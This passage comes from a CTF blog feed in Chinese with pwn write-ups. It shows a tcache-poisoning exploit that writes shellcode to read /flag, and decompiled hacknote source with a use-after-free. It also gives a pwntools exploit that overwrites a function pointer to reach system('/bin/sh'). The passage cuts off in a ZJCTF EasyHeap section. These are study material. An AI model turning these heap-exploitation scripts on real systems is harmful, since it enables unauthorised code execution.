class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">20392</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x12次操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):  <span class="comment">#最多8次alloc</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):   <span class="comment">#最多3次free</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#3 指向tcache_perthread_struct(heap_base+0x10)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">0x40</span>) <span class="comment">#修改tcache_perthread_struct中的对应tcache bins的chunk数量</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#进入unsorted bin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">malloc_hook_add=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span><span class="comment"># 泄露出malloc_hook，在较低版本中unsortedbin的表头距main_arena起始地址的偏移为88，这个版本为96。而malloc_hook距main_arena就是0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(malloc_hook_add))</span><br><span class="line"><span class="comment">#libcbase=malloc_hook_add-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#4，将tcache_perthread_struct申请回来了</span></span><br><span class="line">magic_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x40</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+p64(malloc_hook_add)+p64(magic_add)) <span class="comment">#修改0x80和0x90的tcachebin为malloc_hook和rwx内存</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">flag_add=heap_base+<span class="number">0x270</span> <span class="comment">#将flag读入堆区</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5 申请到rwx内存</span></span><br><span class="line">edit(<span class="number">5</span>, shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x70</span>) <span class="comment">#6 申请到malloc_hook地址</span></span><br><span class="line">edit(<span class="number">6</span>, p64(magic_add))<span class="comment">#将malloc_hook指向shellcode</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#7 执行malloc_hook</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> tcache attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于fastbin attack与unsortedbin leak</title>
      <link href="/2025/07/01/%E5%85%B3%E4%BA%8Efastbin-attack%E4%B8%8Eunsortedbin-leak/"/>
      <url>/2025/07/01/%E5%85%B3%E4%BA%8Efastbin-attack%E4%B8%8Eunsortedbin-leak/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>以三道循序渐进的题目为例来分析吧。</p><h2 id="0x01-hitcontraining-uaf-hacknote"><a href="#0x01-hitcontraining-uaf-hacknote" class="headerlink" title="0x01 hitcontraining_uaf &#x2F; hacknote"></a>0x01 hitcontraining_uaf &#x2F; hacknote</h2><h3 id="复盘-uaf-heapoverflow"><a href="#复盘-uaf-heapoverflow" class="headerlink" title="复盘&#x2F;uaf&#x2F;heapoverflow"></a>复盘&#x2F;uaf&#x2F;heapoverflow</h3><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v1; // esi</span><br><span class="line">  char buf[8]; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  size_t size; // [esp+8h] [ebp-10h]</span><br><span class="line">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  if ( count &gt; 5 )</span><br><span class="line">    return puts(&quot;Full&quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">    if ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;notelist + i) = malloc(8u);</span><br><span class="line">      if ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">      printf(&quot;Note size :&quot;);</span><br><span class="line">      read(0, buf, 8u);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">      *(_DWORD *)(v1 + 4) = malloc(size);</span><br><span class="line">      if ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + 4) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content :&quot;);</span><br><span class="line">      read(0, *(void **)(*((_DWORD *)&amp;notelist + i) + 4), size);</span><br><span class="line">      puts(&quot;Success !&quot;);</span><br><span class="line">      return ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个我们申请的chunk其实实现时申请了两个chunk，第一个数据区大小0x8储存print_note_content，一个函数，接下才是我们申请大小的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + v2) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + v2));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后指针没有置NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (**((<span class="type">int</span> (__cdecl ***)(_DWORD))&amp;notelist + v2))(*((_DWORD *)&amp;notelist + v2));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发现有后门函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:08048945 magic           proc near</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 var_4           = dword ptr -4</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 ; __unwind &#123;</span><br><span class="line">.text:08048945                 push    ebp</span><br><span class="line">.text:08048946                 mov     ebp, esp</span><br><span class="line">.text:08048948                 push    ebx</span><br><span class="line">.text:08048949                 sub     esp, 4</span><br><span class="line">.text:0804894C                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048951                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08048956                 sub     esp, 0Ch</span><br><span class="line">.text:08048959                 lea     edx, (aBinSh - 804A000h)[eax] ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804895F                 push    edx             ; command</span><br><span class="line">.text:08048960                 mov     ebx, eax</span><br><span class="line">.text:08048962                 call    _system</span><br></pre></td></tr></table></figure><p>位于0x8048945处<br>checksec看一眼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/hacknote&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>很好，32位保护全关<br>delete_note函数存在uaf漏洞，我们先申请两个大小0x20（只要不等于0x8且在fastbin要求内即可，如果申请0x8的chunk，释放时会和存储print_note_content函数的chunk放在同一个fastbin中，后续便不好处理了）的chunk，chunk0和chunk1<br>再分别释放掉，这时其实释放了四个chunk，两两位于不同的fastbin中<br>只要我们再申请一个0x8大小的chunk，程序需要分配两个0x8的chunk，正好是chunk0和chunk1的函数chunk，然后我们写入magic函数的地址，便覆盖了chunk0的print_note_content函数，这时候再执行print chunk0时候就直接getshell了<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29391</span>)</span><br><span class="line">shell_add=<span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p64(shell_add))</span><br><span class="line">put(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-ZJCTF-2019-EasyHeap"><a href="#0x02-ZJCTF-2019-EasyHeap" class="headerlink" title="0x02 [ZJCTF 2019]EasyHeap"></a>0x02 [ZJCTF 2019]EasyHeap</h2><h3 id="复盘-fastbin-attack-got表覆写-heapoverflow"><a href="#复盘-fastbin-attack-got表覆写-heapoverflow" class="headerlink" title="复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow"></a>复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow</h3><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == 